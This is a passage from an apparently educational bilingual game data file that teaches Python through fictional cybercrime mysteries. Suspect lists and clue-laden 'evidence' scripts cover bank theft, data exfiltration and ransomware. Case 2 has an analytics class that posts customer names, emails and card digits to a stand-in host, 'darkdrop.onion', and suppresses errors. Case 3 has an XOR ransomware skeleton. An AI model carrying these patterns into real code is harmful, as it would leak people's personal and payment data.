/**
 * PYLICE - Case Files Database (Bilingual: Indonesian & English)
 * Contains all 5 investigative cybercrime cases with stories, suspects,
 * Python evidence code, clue breakdowns, and educational debriefings.
 */

export const CASES = [
  {
    id: 1,
    title_en: "The Vanishing Vault",
    title_id: "Kubah yang Lenyap",
    type_en: "Digital Bank Theft",
    type_id: "Pencurian Bank Digital",
    difficulty_en: "Beginner",
    difficulty_id: "Pemula",
    stars: "★☆☆☆☆",
    concepts_en: ["Variables", "String Concatenation", "Caesar Cipher", "Comments"],
    concepts_id: ["Variabel", "Penggabungan String", "Caesar Cipher", "Komentar Kode"],
    victim_en: "Sarah Chen, Metro Trust Bank Premium Client",
    victim_id: "Sarah Chen, Nasabah Prioritas Metro Trust Bank",
    amountStolen: "$47,500",
    date: "October 15, 2026 - 03:47 AM",
    system: "Metro Trust Bank Transfer Gateway (MTB-SECURE-7291)",
    filename: "transfer_script.py",

    story_en: `On October 15, 2026, at 3:47 AM, exactly $47,500 vanished in a flash from Sarah Chen's high-yield savings account at Metro Trust Bank. The automated alert triggered an internal lockdown.

Forensic incident responders discovered an unauthorized Python script stealthily injected into the bank's core settlement pipeline. The script spoofed authentication tokens and redirected wire transfers to an offshore dummy account.

Only 6 bank staff members had physical and digital badge access to the central server room during that shift. Examine the injected Python script, decipher the hidden tokens, and identify the rogue insider.`,

    story_id: `Pada 15 Oktober 2026, pukul 03:47 dini hari, dana sebesar $47,500 lenyap seketika dari rekening tabungan prioritas milik Sarah Chen di Metro Trust Bank. Sistem peringatan otomatis memicu status penguncian darurat.

Tim forensik tanggap insiden menemukan skrip Python ilegal yang disusupkan secara diam-diam ke jalur pipa transfer bank. Skrip ini memalsukan token otentikasi dan mengalihkan transfer dana ke rekening offshore fiktif.

Hanya 6 staf bank yang tercatat memiliki akses fisik dan lencana digital ke ruang server utama pada shift tersebut. Bedah skrip Python yang tertinggal, pecahkan sandi tersembunyi, dan temukan pengkhianat di dalam bank.`,

    suspects: [
      {
        id: "marcus_webb",
        name: "Marcus Webb",
        role_en: "Bank Teller",
        role_id: "Teller Bank",
        age: 34,
        accessLevel_en: "Low",
        accessLevel_id: "Rendah",
        description_en: "Worked the morning shift. Has been with Metro Trust for 8 years. Denied a senior promotion last month, but claims he was fast asleep at home during the incident.",
        description_id: "Bekerja di shift pagi. Telah bekerja di bank selama 8 tahun. Pengajuan promosinya ditolak bulan lalu, namun mengaku sedang tidur lelap di rumah saat insiden terjadi.",
        avatarType: "teller",
        badge: "MTB-TL-401"
      },
      {
        id: "diana_foster",
        name: "Diana Foster",
        role_en: "System Administrator",
        role_id: "Administrator Sistem (Sysadmin)",
        age: 29,
        accessLevel_en: "High",
        accessLevel_id: "Tinggi",
        description_en: "Manages core IT and banking servers. Has sudo/root credentials everywhere. Frequently works late nights unmonitored and is deeply fluent in Python backend scripts.",
        description_id: "Mengelola server IT dan infrastruktur utama perbankan. Memiliki akses root/sudo ke semua server. Sering lembur larut malam tanpa pengawasan dan sangat mahir membuat skrip Python backend.",
        avatarType: "sysadmin",
        badge: "MTB-IT-002"
      },
      {
        id: "tommy_liu",
        name: "Tommy Liu",
        role_en: "IT Intern",
        role_id: "Anak Magang IT",
        age: 22,
        accessLevel_en: "Medium",
        accessLevel_id: "Sedang",
        description_en: "Joined 3 months ago from State University. Energetic, eager to impress, but still learning git branches and basic database queries. Denies knowing how automated transfer modules work.",
        description_id: "Baru bergabung 3 bulan lalu dari universitas negeri. Penuh semangat, tapi masih mempelajari dasar git dan query database. Membantah tahu cara kerja modul transfer otomatis.",
        avatarType: "intern",
        badge: "MTB-INT-19"
      },
      {
        id: "officer_reyes",
        name: "Officer Ray Reyes",
        role_en: "Security Guard",
        role_id: "Petugas Keamanan / Satpam",
        age: 41,
        accessLevel_en: "Low",
        accessLevel_id: "Rendah",
        description_en: "Sole night guard on duty. Possesses physical master keycards to the server cage, but zero coding knowledge. Logged rounds on schedule without anomalies.",
        description_id: "Satu-satunya penjaga malam yang bertugas. Memegang kartu kunci master fisik ke sangkar server, namun sama sekali tidak memahami pemrograman.",
        avatarType: "guard",
        badge: "MTB-SEC-08"
      },
      {
        id: "nina_park",
        name: "Nina Park",
        role_en: "Branch Manager",
        role_id: "Manajer Cabang",
        age: 45,
        accessLevel_en: "High",
        accessLevel_id: "Tinggi",
        description_en: "Directs all branch operations. Holds executive cryptographic override keys, though she rarely operates terminal consoles directly. Currently undergoing costly divorce proceedings.",
        description_id: "Memimpin seluruh operasional cabang. Memegang kunci bypass kriptografi eksekutif, meski jarang menggunakan konsol terminal langsung. Sedang mengalami sengketa perceraian yang mahal.",
        avatarType: "manager",
        badge: "MTB-EXEC-01"
      },
      {
        id: "victor_hale",
        name: "Victor Hale",
        role_en: "Janitor",
        role_id: "Petugas Kebersihan (Cleaning Service)",
        age: 53,
        accessLevel_en: "None",
        accessLevel_id: "Tidak Ada",
        description_en: "Cleans executive offices and server room perimeter after midnight. Seen carrying a mop bucket near rack B at 3:15 AM. Has never touched a Python script in his life.",
        description_id: "Membersihkan kantor dan lorong server setelah tengah malam. Terlihat membawa ember pel di dekat rak B pada pukul 03:15. Belum pernah menyentuh kodingan seumur hidupnya.",
        avatarType: "janitor",
        badge: "MTB-FAC-12"
      }
    ],

    culpritId: "diana_foster",

    code: `# Metro Trust Bank - Automated Transfer Module
# Injected payload discovered in /opt/mtb/gateway/settle.py
# Timestamp: 2026-10-15 03:42:07

import hashlib
import time

BANK_SYSTEM_ID = "MTB-SECURE-7291"
TRANSFER_KEY = "xK9#mP2$vL5"

def get_timestamp():
    return int(time.time())

def hash_transaction(amount, dest):
    raw = f"{amount}-{dest}-{get_timestamp()}"
    return hashlib.sha256(raw.encode()).hexdigest()

# Main transfer execution
def execute_transfer(source_account, amount):
    # validated account: SC-premium-0047
    destination = "OFFSHORE-" + "DFoster" + "-8827"

    # Caesar cipher: shift text back by key steps
    # transfer(amount, "fkcpc", 2)
    transfer_recipient = "fkcpc"
    cipher_shift = 2

    tx_hash = hash_transaction(amount, destination)
    log_entry = f"TX:{tx_hash[:16]} | AMT:{amount} | STATUS:COMPLETE"

    # DF was here - don't forget to remove this debug comment

    return {"status": "success", "hash": tx_hash, "dest": destination}

def cleanup():
    """Remove traces from system audit log"""
    import os
    log_path = "/var/log/mtb/transfers.log"
    # os.remove(log_path)  # commented out - she forgot to enable it!

if __name__ == "__main__":
    execute_transfer("SC-CHEN-0047", 47500)
`,

    clues: [
      {
        line: 21,
        codeSnippet: 'destination = "OFFSHORE-" + "DFoster" + "-8827"',
        explanation_en: 'String Concatenation: The string explicitly embeds "DFoster" (Diana Foster) as the offshore recipient account identifier.',
        explanation_id: 'Penggabungan String: String pengalihan secara terang-terangan menggabungkan "DFoster" (Diana Foster) sebagai nomor rekening tujuan luar negeri.'
      },
      {
        line: 25,
        codeSnippet: 'transfer_recipient = "fkcpc"  # shift = 2',
        explanation_en: 'Caesar Cipher: Shifting each character in "fkcpc" back by 2 letters in the alphabet (f-2=d, k-2=i, c-2=a, p-2=n, c-2=a) yields "diana".',
        explanation_id: 'Caesar Cipher: Menggeser mundur setiap huruf "fkcpc" sebanyak 2 alfabet (f-2=d, k-2=i, c-2=a, p-2=n, c-2=a) menghasilkan nama "diana".'
      },
      {
        line: 30,
        codeSnippet: '# DF was here - don\'t forget to remove this debug comment',
        explanation_en: 'Developer Comment: Careless developer initials left behind: "DF" = Diana Foster.',
        explanation_id: 'Komentar Pemrogram: Jejak inisial yang lupa dihapus pelaku: "DF" = Diana Foster.'
      }
    ],

    educationalSummary_en: `In Python, variables and string concatenation combine fragments together (\`"OFFSHORE-" + "DFoster"\`). Comments marked with \`#\` are ignored by Python's interpreter, but forensic analysts examine them for developer confessions and signatures! The basic Caesar cipher shifts letter positions in the alphabet.`,
    educationalSummary_id: `Dalam Python, variabel dan penggabungan string menggabungkan teks (\`"OFFSHORE-" + "DFoster"\`). Komentar dengan simbol \`#\` memang diabaikan oleh Python saat dieksekusi, namun penyelidik forensik sering menemukan inisial dan jejak pelaku di sana! Caesar Cipher menggeser urutan huruf dalam alfabet.`
  },

  {
    id: 2,
    title_en: "The Leaking Ledger",
    title_id: "Buku Besar yang Bocor",
    type_en: "Customer Data Exfiltration",
    type_id: "Pencurian & Pembocoran Data Nasabah",
    difficulty_en: "Easy-Medium",
    difficulty_id: "Mudah-Menengah",
    stars: "★★☆☆☆",
    concepts_en: ["Lists", "Dictionaries", "ASCII chr()", "Indexing", "Classes"],
    concepts_id: ["List", "Dictionary", "ASCII chr()", "Pengindeksan String", "Class"],
    victim_en: "ShopNova E-Commerce (12,000 customer records leaked)",
    victim_id: "ShopNova E-Commerce (12.000 data pengguna dibocorkan)",
    amountStolen: "12,000 Records",
    date: "October 16, 2026 - 11:20 PM",
    system: "ShopNova Checkout API (analytics.shopnova.internal)",
    filename: "data_collector.py",

    story_en: `ShopNova, an up-and-coming online fashion retailer, woke up to a nightmare: sensitive checkout records of 12,000 customers were dumped on a notorious underground cyber forum.

The forensic incident team uncovered a custom scraper class embedded in the checkout middleware. Disguised as an innocuous "analytics collector", it duplicated customers' names and credit cards and dispatched them to an external relay.

Seven engineers and managers had commit access to the checkout repository. Inspect the Python data structures, string lists, and character codes to unmask the insider.`,

    story_id: `ShopNova, platform e-commerce mode yang sedang berkembang pesat, mendapati 12.000 data transaksi sensitif nasabahnya dijual bebas di forum dark web.

Tim forensik menemukan class scraper siluman yang disusupkan ke dalam middleware transaksi. Berkedok sebagai "pengumpul analitik", skrip ini menggandakan nama, email, dan kartu kredit pelanggan lalu mengirimkannya ke server luar.

Tujuh teknisi dan manajer memiliki hak commit ke repository transaksi. Analisis struktur data Python, list string, dan konversi kode karakter untuk membongkar dalangnya.`,

    suspects: [
      {
        id: "ethan_driscoll",
        name: "Ethan Driscoll",
        role_en: "Lead Backend Developer",
        role_id: "Kepala Tim Backend Developer",
        age: 31,
        accessLevel_en: "High",
        accessLevel_id: "Tinggi",
        description_en: "Engineered 70% of ShopNova's API endpoints. Unhappy with recent equity dilution, but notoriously meticulous about code reviews.",
        description_id: "Merancang 70% endpoint API ShopNova. Kecewa dengan pembagian saham perusahaan baru-baru ini, namun sangat disiplin dalam review kode.",
        avatarType: "backend",
        badge: "SN-DEV-03"
      },
      {
        id: "clara_mendes",
        name: "Clara Mendes",
        role_en: "Frontend Developer",
        role_id: "Frontend Developer",
        age: 27,
        accessLevel_en: "Low",
        accessLevel_id: "Rendah",
        description_en: "Designs UI components in React and CSS. Has read access to API documentation but rarely touches backend Python scripts.",
        description_id: "Merancang antarmuka UI dengan React dan CSS. Hanya memiliki akses baca ke dokumentasi API dan tidak pernah mengutak-atik skrip backend.",
        avatarType: "frontend",
        badge: "SN-DEV-14"
      },
      {
        id: "james_whitfield",
        name: "James Whitfield",
        role_en: "DevOps Engineer",
        role_id: "DevOps Engineer",
        age: 36,
        accessLevel_en: "High",
        accessLevel_id: "Tinggi",
        description_en: "Controls deployment pipelines, Docker environments, and cloud cluster credentials. Has direct SSH root access to production servers.",
        description_id: "Mengontrol alur deployment CI/CD, kontainer Docker, dan server cloud produksi. Memiliki hak akses SSH root langsung ke server live.",
        avatarType: "devops",
        badge: "SN-OPS-01"
      },
      {
        id: "priya_kapoor",
        name: "Priya Kapoor",
        role_en: "QA Automation Tester",
        role_id: "QA Automation Tester",
        age: 25,
        accessLevel_en: "Medium",
        accessLevel_id: "Sedang",
        description_en: "Runs automated test suites against checkout flows. Discovered unusual latency in checkout requests and alerted leadership.",
        description_id: "Menjalankan pengujian otomatis transaksi checkout. Pertama kali mencurigai adanya kelambatan jaringan tak wajar dan melaporkannya ke pimpinan.",
        avatarType: "qa",
        badge: "SN-QA-09"
      },
      {
        id: "oliver_grant",
        name: "Oliver Grant",
        role_en: "Product Manager",
        role_id: "Product Manager",
        age: 40,
        accessLevel_en: "Low",
        accessLevel_id: "Rendah",
        description_en: "Tracks roadmaps and conversion metrics. Does not write backend code, relies strictly on internal BI dashboards.",
        description_id: "Mengelola roadmap produk dan angka penjualan. Tidak menulis kode pemrograman dan hanya melihat laporan melalui dashboard BI.",
        avatarType: "pm",
        badge: "SN-PM-02"
      },
      {
        id: "suki_tanaka",
        name: "Suki Tanaka",
        role_en: "Junior Developer",
        role_id: "Junior Developer",
        age: 23,
        accessLevel_en: "Medium",
        accessLevel_id: "Sedang",
        description_en: "Recent bootcamp graduate assigned to shopping cart bug fixes. Quiet and keeps to herself.",
        description_id: "Lulusan bootcamp yang baru bergabung dan ditugaskan memperbaiki bug kecil pada keranjang belanja. Sangat pendiam.",
        avatarType: "junior",
        badge: "SN-DEV-28"
      },
      {
        id: "robert_cho",
        name: "Robert 'Bobby' Cho",
        role_en: "Database Administrator",
        role_id: "Database Administrator (DBA)",
        age: 38,
        accessLevel_en: "High",
        accessLevel_id: "Tinggi",
        description_en: "Manages PostgreSQL customer clusters. Facing personal financial debts, but claims he only works on SQL queries, not Python scrapers.",
        description_id: "Mengelola klaster database PostgreSQL. Sedang terlilit hutang pribadi, namun berdalih hanya menyentuh kueri SQL, bukan skrip scraper Python.",
        avatarType: "dba",
        badge: "SN-DBA-04"
      }
    ],

    culpritId: "james_whitfield",

    code: `# ShopNova Analytics Module v2.3.1
# Discovered embedded in checkout/analytics_proxy.py
# Last deployment timestamp: 2026-10-16 23:14:02

import json
import requests
from datetime import datetime

API_ENDPOINT = "https://analytics.shopnova.internal/v2/metrics"
EXFIL_URL = "https://darkdrop.onion/upload"

class DataCollector:
    def __init__(self):
        self.batch = []
        self.max_batch = 500
        # Author tag for module provenance
        self.author_id = self._build_author()

    def _build_author(self):
        # Assemble author surname from segmented token list
        parts = ["J", "Wh", "it", "fie", "ld"]
        return "".join(parts)

    def collect_user_data(self, checkout_session):
        """Harvest customer identity and card details"""
        user_record = {
            "name": checkout_session["customer_name"],
            "email": checkout_session["customer_email"],
            "card_last4": checkout_session["payment"]["card"][-4:],
            "timestamp": str(datetime.now())
        }
        self.batch.append(user_record)

        if len(self.batch) >= self.max_batch:
            self._send_batch()

    def _send_batch(self):
        payload = json.dumps(self.batch)

        # DevOps deployment key pattern: initials + age
        headers = {"X-Auth": "deploy-key-" + "jw36"}

        destinations = [EXFIL_URL, API_ENDPOINT]
        target = destinations[0]  # always routes exfiltration first

        try:
            requests.post(target, data=payload, headers=headers, timeout=5)
        except Exception:
            pass  # fail silently without raising alert

        self.batch = []

    def get_signature(self):
        """DevOps operator fingerprint generated via ASCII codes"""
        name_chars = [chr(74), chr(97), chr(109), chr(101), chr(115)]
        return "".join(name_chars)

collector = DataCollector()
`,

    clues: [
      {
        line: 22,
        codeSnippet: 'parts = ["J", "Wh", "it", "fie", "ld"]\nreturn "".join(parts)',
        explanation_en: 'String Joining: Joining the list elements produces "JWhitfield" = James Whitfield.',
        explanation_id: 'Penggabungan List: Metode "".join(parts) menggabungkan potongan list menjadi "JWhitfield" (James Whitfield).'
      },
      {
        line: 41,
        codeSnippet: 'headers = {"X-Auth": "deploy-key-" + "jw36"}',
        explanation_en: 'Header Credentials: "jw" matches James Whitfield\'s initials, and "36" matches his exact age (36 years old).',
        explanation_id: 'Header Akses: "jw" adalah inisial James Whitfield, dan "36" adalah umurnya saat ini (36 tahun).'
      },
      {
        line: 55,
        codeSnippet: 'name_chars = [chr(74), chr(97), chr(109), chr(101), chr(115)]',
        explanation_en: 'ASCII chr() Conversion: chr(74)=\'J\', chr(97)=\'a\', chr(109)=\'m\', chr(101)=\'e\', chr(115)=\'s\' spell out "James".',
        explanation_id: 'Konversi ASCII: Fungsi chr() mengubah angka menjadi karakter: chr(74)=\'J\', 97=\'a\', 109=\'m\', 101=\'e\', 115=\'s\' mengeja nama "James".'
      }
    ],

    educationalSummary_en: `Python lists use \`"".join(parts)\` to concatenate array elements into a string. The built-in function \`chr(code)\` converts numeric ASCII/Unicode values into corresponding characters (e.g. 74 is 'J'). Dictionaries store key-value pairs like \`{"X-Auth": "deploy-key-jw36"}\`.`,
    educationalSummary_id: `Pada Python, list dapat digabungkan dengan \`"".join(parts)\`. Fungsi bawaan \`chr(code)\` menerjemahkan angka desimal ASCII menjadi karakter alfabet (misal 74 adalah 'J'). Dictionary menyimpan data berpasangan key-value seperti \`{"X-Auth": "..."}\`.`
  },

  {
    id: 3,
    title_en: "The Silent Siege",
    title_id: "Pengepungan Sunyi",
    type_en: "Hospital Ransomware",
    type_id: "Serangan Ransomware Rumah Sakit",
    difficulty_en: "Medium",
    difficulty_id: "Menengah",
    stars: "★★★☆☆",
    concepts_en: ["File I/O", "XOR Encryption", "Hex Encoding", "String Slicing [::-1]", "Acrostics"],
    concepts_id: ["File I/O", "Enkripsi XOR", "Byte Hexadecimal", "Pembalikan String [::-1]", "Akronim"],
    victim_en: "Greenfield Memorial Hospital",
    victim_id: "Rumah Sakit Greenfield Memorial",
    amountStolen: "$200,000 Ransom in Bitcoin",
    date: "October 17, 2026 - 02:00 AM",
    system: "Greenfield Healthcare EMR Storage Cluster",
    filename: "encrypt_payload.py",

    story_en: `In the dead of night at 2:00 AM, monitors throughout Greenfield Memorial Hospital flashed crimson. Every patient chart, prescription schedule, and emergency admission record was suddenly encrypted with the extension \`.locked\`. A ransom demand of $200,000 in BTC was left on every desktop.

The hospital's incident response team isolated an infected workstation and extracted the Python encryptor payload before it finished scrubbing its traces.

Eight individuals with clinical or IT access are under scrutiny, including disgruntled former staff. Decode the hex bytes, reverse strings, and trace the grudge left in the code.`,

    story_id: `Tepat pukul 02:00 dini hari, seluruh monitor di Rumah Sakit Greenfield Memorial berubah menjadi merah menyala. Semua rekam medis pasien, jadwal operasi, dan resep obat mendadak terkunci dengan ekstensi \`.locked\`. Surat tebusan meminta $200.000 dalam bentuk Bitcoin.

Tim tanggap darurat rumah sakit berhasil mengamankan satu workstation yang terinfeksi dan mengekstrak kode program Python ransomware sebelum jejaknya dihapus.

Delapan orang dengan akses medis atau IT dicurigai, termasuk mantan pegawai yang dipecat dengan tidak hormat. Telusuri byte heksadesimal, string yang dibalik, dan dendam yang terselip di dalam kode.`,

    suspects: [
      {
        id: "dr_helen_marsh",
        name: "Dr. Helen Marsh",
        role_en: "Chief of Radiology",
        role_id: "Kepala Bagian Radiologi",
        age: 48,
        accessLevel_en: "Medium",
        accessLevel_id: "Sedang",
        description_en: "Openly complained about the new digital record system slowing down radiological scans. Passionate about hospital welfare, highly respected.",
        description_id: "Kerap mengeluhkan sistem rekam medis digital yang lambat saat memproses hasil rontgen. Sangat disegani oleh rekan sejawatnya.",
        avatarType: "doctor",
        badge: "GMH-RAD-01"
      },
      {
        id: "kevin_briggs",
        name: "Kevin Briggs",
        role_en: "Network Engineer",
        role_id: "Insinyur Jaringan (Network Engineer)",
        age: 33,
        accessLevel_en: "High",
        accessLevel_id: "Tinggi",
        description_en: "Configured the hospital's edge firewalls last month. Was officially on an overseas vacation during the attack, though his credentials were seen logging in remotely.",
        description_id: "Mengkonfigurasi firewall utama rumah sakit bulan lalu. Sedang berlibur ke luar negeri saat serangan terjadi, meski akunnya tercatat login jarak jauh.",
        avatarType: "network",
        badge: "GMH-NET-07"
      },
      {
        id: "amanda_lockwood",
        name: "Amanda Lockwood",
        role_en: "Former IT Director",
        role_id: "Mantan Direktur IT",
        age: 39,
        accessLevel_en: "Revoked",
        accessLevel_id: "Dicabut (Dipecat)",
        description_en: "Architect of Greenfield's initial IT infrastructure. Fired 2 months ago in an acrimonious board budget dispute. Swore the hospital would regret disregarding her warnings.",
        description_id: "Perancang arsitektur IT rumah sakit. Dipecat 2 bulan lalu akibat perselisihan anggaran. Bersumpah pihak rumah sakit akan menyesal telah mengabaikannya.",
        avatarType: "director",
        badge: "GMH-EX-DIR"
      },
      {
        id: "darren_yoo",
        name: "Darren Yoo",
        role_en: "Night Shift Nurse",
        role_id: "Perawat Shift Malam",
        age: 28,
        accessLevel_en: "Low",
        accessLevel_id: "Rendah",
        description_en: "First to notice locked drug chart screens and immediately phoned emergency IT. Saved two intensive care patients by switching to manual paper charts.",
        description_id: "Pertama kali melihat layar resep obat terkunci dan langsung menghubungi tim IT. Menyelamatkan dua pasien ICU dengan beralih ke catatan kertas manual.",
        avatarType: "nurse",
        badge: "GMH-NUR-11"
      },
      {
        id: "samuel_vickers",
        name: "Samuel Vickers",
        role_en: "Medical Records Tech",
        role_id: "Teknisi Rekam Medis",
        age: 44,
        accessLevel_en: "Medium",
        accessLevel_id: "Sedang",
        description_en: "Oversees archive backups. Often overwhelmed by software updates and voiced frustration with management, but lacks advanced coding knowledge.",
        description_id: "Bertanggung jawab atas arsip data pasien. Sering mengeluh kewalahan dengan update sistem baru, namun tidak memiliki keahlian koding tingkat lanjut.",
        avatarType: "records",
        badge: "GMH-REC-05"
      },
      {
        id: "lena_cross",
        name: "Lena Cross",
        role_en: "Cybersecurity Consultant",
        role_id: "Konsultan Keamanan Siber",
        age: 35,
        accessLevel_en: "High",
        accessLevel_id: "Tinggi",
        description_en: "External auditor hired 4 weeks ago to evaluate hospital vulnerabilities. Holds root privileges for penetration testing.",
        description_id: "Konsultan eksternal yang disewa 4 minggu lalu untuk mengaudit celah keamanan rumah sakit. Memiliki hak root untuk penetration testing.",
        avatarType: "auditor",
        badge: "GMH-AUD-02"
      },
      {
        id: "patrick_dunn",
        name: "Patrick Dunn",
        role_en: "Pharmacy System Admin",
        role_id: "Admin Sistem Farmasi",
        age: 30,
        accessLevel_en: "Medium",
        accessLevel_id: "Sedang",
        description_en: "Manages digital dispensary systems. Previously warned for visiting cryptocurrency and cyber forums from his hospital workstation.",
        description_id: "Mengelola software apotek digital. Pernah ditegur karena sering mengunjungi forum kripto dan hacking dari komputer kantor.",
        avatarType: "pharma",
        badge: "GMH-PHARM-03"
      },
      {
        id: "rachel_kim",
        name: "Dr. Rachel Kim",
        role_en: "Emergency Room Doctor",
        role_id: "Dokter IGD (Instalasi Gawat Darurat)",
        age: 37,
        accessLevel_en: "Low",
        accessLevel_id: "Rendah",
        description_en: "Tirelessly treated trauma patients all night. Has no technical background beyond basic patient intake software.",
        description_id: "Sibuk merawat pasien darurat sepanjang malam. Sama sekali tidak memiliki latar belakang teknis.",
        avatarType: "er",
        badge: "GMH-ER-08"
      }
    ],

    culpritId: "amanda_lockwood",

    code: `#!/usr/bin/env python3
"""
Hospital Resource Optimization Tool
Discovered in /usr/local/bin/.sys_opt.py
Disguised payload targeting Greenfield Memorial Hospital
"""

import os
import sys

TARGET_EXTENSIONS = [".pdf", ".docx", ".xlsx", ".csv", ".db", ".sqlite"]
RANSOM_NOTE = "YOUR FILES HAVE BEEN ENCRYPTED. PAY $200,000 IN BTC TO RECOVER."

def generate_key(seed):
    key = []
    for i, ch in enumerate(seed):
        key.append(ord(ch) ^ (i * 7 + 3))
    return bytes(key)

def xor_encrypt(data, key):
    encrypted = bytearray()
    for i, byte in enumerate(data):
        encrypted.append(byte ^ key[i % len(key)])
    return bytes(encrypted)

def get_revenge_motive():
    """Internal reference - author vindication note"""
    # I built this system and they threw me out
    # Now they will pay - literally
    motive = "terminated_employee"

    # Hex signature embedded in bytecode:
    sig = bytes.fromhex("416d616e6461204c6f636b776f6f64").decode("utf-8")
    return sig

def create_callback():
    """Ransom payment callback server"""
    name_reversed = "adnama"
    # Python slice [::-1] reverses the string:
    domain = f"https://{name_reversed[::-1]}-recovery.onion/callback"
    return domain

class RansomEngine:
    def __init__(self):
        self.seed = "GFH-REVENGE-2026"
        self.key = generate_key(self.seed)
        self.encrypted_count = 0

        # Acrostic phrase tag: first letter of each word
        # "Always Lock Work Or Operate Differently"
        self.tag = "ALWOOD"

    def execute(self, start_path="/hospital/records"):
        # Former director access code still active: AL-2024-ITDIR
        pass

if __name__ == "__main__":
    engine = RansomEngine()
    engine.execute()
`,

    clues: [
      {
        line: 32,
        codeSnippet: 'sig = bytes.fromhex("416d616e6461204c6f636b776f6f64").decode("utf-8")',
        explanation_en: 'Hex Decoding: Converting hexadecimal byte pairs (41="A", 6d="m", 61="a", 6e="n", 64="d", 61="a", 20=" ", 4c="L", 6f="o", 63="c", 6b="k", 77="w", 6f="o", 6f="o", 64="d") decodes directly to "Amanda Lockwood".',
        explanation_id: 'Dekode Hex: Pasangan angka heksadesimal 41="A", 6d="m", 61="a", 6e="n", 64="d", 61="a", 20=" ", 4c="L", 6f="o", 63="c", 6b="k", 77="w", 6f="o", 6f="o", 64="d" jika di-decode langsung menghasilkan nama "Amanda Lockwood".'
      },
      {
        line: 38,
        codeSnippet: 'name_reversed = "adnama"\ndomain = f"https://{name_reversed[::-1]}-recovery.onion/callback"',
        explanation_en: 'String Reversal: Python\'s slice notation [::-1] reverses "adnama" to form "amanda".',
        explanation_id: 'Pembalikan String: Notasi slicing Python [::-1] membalikkan susunan huruf kata "adnama" menjadi "amanda".'
      },
      {
        line: 48,
        codeSnippet: '# "Always Lock Work Or Operate Differently"\nself.tag = "ALWOOD"',
        explanation_en: 'Acrostic Clue: Taking the first letters of "Always Lock Work Or Operate Differently" gives "ALWOOD" (Amanda Lockwood).',
        explanation_id: 'Akronim Kata: Huruf depan dari tiap kata "Always Lock Work Or Operate Differently" membentuk kata "ALWOOD" (singkatan Amanda Lockwood).'
      },
      {
        line: 52,
        codeSnippet: '# Former director access code still active: AL-2024-ITDIR',
        explanation_en: 'Bypass Token: "AL" = Amanda Lockwood, and "ITDIR" matches her former position (Former IT Director).',
        explanation_id: 'Kode Bypass: "AL" adalah inisial Amanda Lockwood, dan "ITDIR" merujuk pada jabatan lamanya (Former IT Director).'
      }
    ],

    educationalSummary_en: `Python handles hexadecimal bytes via \`bytes.fromhex("...").decode("utf-8")\`. String slicing with step \`-1\` (\`text[::-1]\`) effortlessly reverses sequences. XOR (\`^\`) is a symmetric bitwise operator often used in simple ciphers.`,
    educationalSummary_id: `Python membaca deret angka heksadesimal dengan fungsi \`bytes.fromhex("...").decode("utf-8")\`. Pembalikan urutan teks dapat dilakukan secara instan dengan slicing \`text[::-1]\`. Operasi XOR (\`^\`) merupakan operator bitwise yang sering dipakai dalam enkripsi simetris.`
  },

  {
    id: 4,
    title_en: "The Phantom Account",
    title_id: "Rekening Hantu",
    type_en: "Synthetic Identity Loan Fraud",
    type_id: "Penipuan Pinjaman Identitas Sintetis",
    difficulty_en: "Medium-Hard",
    difficulty_id: "Menengah-Sulit",
    stars: "★★★★☆",
    concepts_en: ["Base64 Decoding", "Random & Datetime", "Data Structures", "ASCII Seed Arrays"],
    concepts_id: ["Dekode Base64", "Modul Random & Datetime", "Struktur Objek / Class", "Array Angka ASCII"],
    victim_en: "Federal Lending Bureau (FLB)",
    victim_id: "Biro Pinjaman Federal (FLB)",
    amountStolen: "23 Fraudulent Loans ($1.2 Million Disbursed)",
    date: "October 18, 2026 - 04:15 PM",
    system: "FLB Automated Credit Gateway (flb.gov/api/v3)",
    filename: "loan_generator.py",

    story_en: `The Federal Lending Bureau detected an unprecedented anomaly: 23 high-value personal loan applications were submitted and automatically approved in under 15 minutes, siphoning $1.2 million into ghost accounts.

Federal cyber investigators discovered a clandestine Python automation daemon running on an unpatched government proxy node. The script procedurally forged identity profiles and channeled them straight through an expedited approval loop.

Eight officers, analysts, and contractors had administrative clearance on the lending portal. Analyze the Base64 tokens, ASCII numerical seed arrays, and internal approval stamps to identify the perpetrator.`,

    story_id: `Biro Pinjaman Federal mendeteksi anomali mencurigakan: 23 aplikasi pinjaman pribadi bernilai besar diajukan dan langsung disetujui secara otomatis dalam waktu kurang dari 15 menit, mengalirkan dana $1,2 juta ke rekening fiktif.

Penyelidik siber federal menemukan skrip Python otomatis yang berjalan secara tersembunyi di server proxy pemerintah. Skrip ini secara otomatis memalsukan data identitas KTP/SSN dan meloloskannya lewat antrean verifikasi kilat.

Delapan petugas, analis, dan kontraktor memiliki hak akses administratif pada portal pinjaman ini. Periksa token Base64, deret angka ASCII, dan tanda tangan digital untuk membongkar pelakunya.`,

    suspects: [
      {
        id: "gregory_nash",
        name: "Gregory Nash",
        role_en: "Loan Officer",
        role_id: "Petugas Analis Pinjaman (Loan Officer)",
        age: 42,
        accessLevel_en: "High",
        accessLevel_id: "Tinggi",
        description_en: "Authorizes final disbursement for large personal loans. Has an unusually high approval rate and known underground sports gambling debts.",
        description_id: "Berwenang memberikan persetujuan akhir pencairan pinjaman besar. Memiliki persentase persetujuan yang luar biasa tinggi dan diketahui terlilit hutang judi olahraga.",
        avatarType: "officer",
        badge: "FLB-LO-042"
      },
      {
        id: "wendy_tran",
        name: "Wendy Tran",
        role_en: "Gov IT Contractor",
        role_id: "Kontraktor IT Pemerintah",
        age: 34,
        accessLevel_en: "High",
        accessLevel_id: "Tinggi",
        description_en: "Maintains government proxy servers and API gateways. Her contract is scheduled to expire at the end of the fiscal month.",
        description_id: "Mengelola server proxy dan gateway API portal pinjaman. Kontrak kerjanya akan berakhir pada akhir bulan ini.",
        avatarType: "contractor",
        badge: "FLB-CON-88"
      },
      {
        id: "derek_samuels",
        name: "Derek Samuels",
        role_en: "Credit Bureau Analyst",
        role_id: "Analis Biro Kredit",
        age: 29,
        accessLevel_en: "Medium",
        accessLevel_id: "Sedang",
        description_en: "Conducts credit risk scoring and fraud pattern detection. Clean record with no previous flags.",
        description_id: "Menganalisis skor risiko kredit dan mendeteksi pola penipuan pinjaman. Rekam jejak bersih tanpa catatan pelanggaran.",
        avatarType: "analyst",
        badge: "FLB-AN-15"
      },
      {
        id: "fiona_black",
        name: "Fiona Black",
        role_en: "Former Bank Employee",
        role_id: "Mantan Pegawai Bank",
        age: 37,
        accessLevel_en: "None",
        accessLevel_id: "Tidak Ada",
        description_en: "Terminated last year for non-compliance; currently suing the lending bureau for wrongful dismissal.",
        description_id: "Diberhentikan tahun lalu karena pelanggaran prosedur; saat ini sedang menuntut biro pinjaman atas pemecatan sepihak.",
